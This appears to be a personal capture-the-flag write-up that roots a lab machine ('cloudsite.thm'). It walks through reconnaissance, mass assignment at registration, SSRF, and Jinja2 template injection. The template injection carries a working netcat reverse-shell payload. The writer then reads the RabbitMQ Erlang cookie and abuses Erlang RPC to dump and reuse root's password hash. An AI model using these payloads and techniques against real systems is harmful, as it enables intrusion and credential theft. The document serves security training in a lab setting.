[[nmap]] scan
```shell
nmap -A -T4 -p- 10.10.239.95
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-03 07:49 GMT
Nmap scan report for 10.10.239.95
Host is up (0.11s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   109.88 ms 10.11.0.1
2   110.06 ms 10.10.239.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.48 seconds
```
open firefox on http://<IP_Maschine> and see this:![[Pasted image 20251106201855.png]]
add thi domain in `/etc/hosts` and use
[[ffuf]] sub domains scan:
```shell
ffuf -u "http://cloudsite.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.cloudsite.thm" -mc all -ac -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://cloudsite.thm
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.cloudsite.thm
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
________________________________________________

storage                 [Status: 200, Size: 9039, Words: 3183, Lines: 263, Duration: 116ms]
#www                    [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 116ms]
#mail                   [Status: 400, Size: 301, Words: 26, Lines: 11, Duration: 115ms]
:: Progress: [19966/19966] :: Job [1/1] :: 61 req/sec :: Duration: [0:00:59] :: Errors: 135 ::
```
find `storage.cloudsite.thm`![[Pasted image 20251106202009.png]]
try to create accaount and take data from caido
![[Pasted image 20251106202359.png]]
![[Pasted image 20251106202412.png]]
okay we make a user, log in
```http
HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 13:24:41 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 8
ETag: W/"8-1Daj9A4+zOiWAQvpnc8ApXe5Cao"
Set-Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjEyM0BtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzYyNDM1NDgxLCJleHAiOjE3NjI0MzkwODF9.55w_zoiQ_OCeZeWc8BxdaDDQbj_8ZAUPFeBobMimGKI; Max-Age=3600; Path=/; Expires=Thu, 06 Nov 2025 14:24:41 GMT; HttpOnly
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

inactive
```
and we have jwt when we login and this on page 
![[Pasted image 20251106202553.png]]
check jwt in `jwt.io`
![[Pasted image 20251106202632.png]]
i tried "alg":"none" and delete sertificate and it's doesnt working:(, after i think about `Mass Assignment` what if i send "subscription": "active" then send a registr request
try it now 
![[Pasted image 20251106203026.png]]
and its successful
![[Pasted image 20251106203049.png]]
log in and
![[Pasted image 20251106203225.png]]
we are in 
on page we can download files from URL and open them but
![[Pasted image 20251106203837.png]]
we cant to use our scripts because application delete extension, u think its a dead and i decided to forget abou page now, i need more data about application(i used Ferroxbuster but dont save scan, know what we have /api endpoints lets check all of them)

```shell
ffuf -u "http://storage.cloudsite.thm/api/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -ac -mc all -t 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: all
________________________________________________

register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 146ms]
Register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 183ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 183ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 181ms]
docs/                   [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 189ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 121ms]
LogIn                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 120ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 118ms]
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 117ms]
login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 117ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 121ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 117ms]
:: Progress: [12334/12334] :: Job [1/1] :: 1485 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```
hands check:![[Pasted image 20251106205113.png]] and nothing interestiong on another pages, 
i tried take page from our URL upload `http://storage.cloudsite.thm/api/docs` ![[Pasted image 20251106210357.png]]
Mayde SSTI take page from http://127.0.0.1:80 ![[Pasted image 20251106210511.png]]
page from site SSTI works, now bruteforce ports with Caido ![[Pasted image 20251106211029.png]]
![[Pasted image 20251106211510.png]]
try http://127.0.0.1:3000/api/docs and we can see this![[Pasted image 20251106211618.png]]
we see test page with POST request
go to caido and start handcheck ![[Pasted image 20251106213414.png]]
![[Pasted image 20251106213944.png]]
XSS 
maybe applicaton paste string in code, lets try to start shell from js code like
```js
{
  "username": "</h1><script src='http://IP:Port/shell.js'></script><h1>"
}
```
i cant start shell from this, now lets try to take insides application of server, use this command
```http
{
"username":"${{<%[%'\"}}%\\."
}
```
and now we have
```http
HTTP/1.1 200 OK
Date: Fri, 07 Nov 2025 11:34:54 GMT
Server: Apache/2.4.52 (Ubuntu)
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
ETag: W/"4f34-uy7o4+9SBW968crwpJz2QgsVIPY-gzip"
Vary: Accept-Encoding
Content-Length: 20276
Connection: close

<!doctype html>
<html lang=en>

<head>
    <title>jinja2.exceptions.TemplateSyntaxError: unexpected &#39;&lt;&#39;
        // Werkzeug Debugger</title>
    <link rel="stylesheet" href="?__debugger__=yes&amp;cmd=resource&amp;f=style.css">
    <link rel="shortcut icon" href="?__debugger__=yes&amp;cmd=resource&amp;f=console.png">
    <script src="?__debugger__=yes&amp;cmd=resource&amp;f=debugger.js"></script>
    <script>
        var CONSOLE_MODE = false,
            EVALEX = true,
            EVALEX_TRUSTED = false,
            SECRET = "weV5OYRg36TFXV1rLMQr";
    </script>
</head>
```
jinja2 and open debugmode with secret, first try to take shell from jinja2
command for this
```http
{
"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.11.147.65 9000 > /tmp/f').read() }}"
}
```
![[Pasted image 20251107184137.png]]
we have our first shell, take user flag
```shell
....
-rw------- 1 azrael azrael   33 Aug 11  2024 user.txt
azrael@forge:~$ cat user.txt
cat user.txt
98d3a30fa86523c580144d317be0c47e

```
remember about our `rabbithole`, try to get .erlang cookie by standart path
`/var/lib/rabbitmq/.erlang.cookie` for process, try to cat
```shell
azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
cat /var/lib/rabbitmq/.erlang.cookie
Wka5wuFO2ZEpnA8Q
```
use hacktricks and this cookie, try to use @forge because we have azrael forge, and before we go next need to add forge in `/etc/hosts`
```shell
erl -sname user -setcookie Wka5wuFO2ZEpnA8Q 
Erlang/OTP 25 [erts-13.1.5] [source] [64-bit] [smp:6:6] [ds:6:6:10] [async-threads:1] [jit:ns]

Eshell V13.1.5  (abort with ^G)
(user@kali)1> rpc:call('rabbit@forge', rabbit_auth_backend_internal, lookup_user, [<<"root">>]).
{ok,{internal_user,<<"root">>,
                   <<227,215,186,133,41,93,29,22,162,97,125,246,247,230,99,5,
                     39,255,47,30,187,92,67,179,...>>,
                   [administrator],
                   rabbit_password_hashing_sha256}}
```

to go next we must convert password hash do base64 to take every bit
because RabbitMQ hashing passords by this schema
```shell
base64(4-byte-salt || SHA256(salt || password))
```
to take root base64(password) use this command
```shell
(user@kali)2> io:format("~s~n", [base64:encode(element(3, element(2, rpc:call('rabbit@forge', rabbit_auth_backend_internal, lookup_user, [<<"root">>]))))]).
49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF
ok
```
we have a hash decode from base64 to hex and take this:
```shell
echo -n '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100
e3d7ba85 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
╰──────╯ ╰──────────────────────────────────────────────────────────────╯
  Salt                               SHA256-hash
```
take a root
```shell
azrael@forge:~/chatbotServer$ su root 
su root 
Password: 295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585

id  
uid=0(root) gid=0(root) groups=0(root)

cat root.txt 
eabf7a0b05d3f2028f3e0465d2fd0852
```
